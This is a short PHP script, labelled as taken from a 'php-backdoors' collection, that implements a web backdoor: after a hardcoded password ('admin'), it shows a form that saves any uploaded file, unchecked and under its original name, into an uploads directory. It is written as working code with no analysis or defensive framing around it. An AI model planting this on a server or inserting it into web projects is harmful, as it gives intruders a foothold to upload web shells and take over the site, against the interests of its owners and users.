 <?php
// from https://github.com/1337r0j4n/php-backdoors
// Start session
session_start();

// Set username and password
$password = "admin";

// Check if user has submitted login form
if(isset($_POST["login"])) {
    // Check if username and password are correct
    if($_POST["password"] == $password) {
        // Set session variable to indicate user is logged in
        $_SESSION["loggedin"] = true;
    } else {
        // Display error message if username or password is incorrect
        $error = "Incorrect password";
    }
}

// Check if user is logged in
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
    // Display file upload form
    echo '
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" name="submit" value="Upload">
        </form>
    ';

    // Check if file has been submitted
    if(isset($_POST["submit"])) {
        // Get file information
        $file_name = $_FILES["file"]["name"];
        $file_tmp = $_FILES["file"]["tmp_name"];
        $file_size = $_FILES["file"]["size"];
        $file_error = $_FILES["file"]["error"];

        // Check if file is valid
        if($file_error === 0) {
            // Move file to desired location
            move_uploaded_file($file_tmp, "uploads/" . $file_name);

            // Display success message
            echo "File uploaded successfully";
        } else {
            // Display error message
            echo "Error uploading file";
        }
    }
} else {
    // Display login form if user is not logged in
    echo '
        <form method="post">
            <label>Password:</label>
            <input type="password" name="password">
            <input type="submit" name="login" value="Login">
        </form>
    ';

    // Display error message if login credentials are incorrect
    if(isset($error)) {
        echo $error;
    }
}
?>
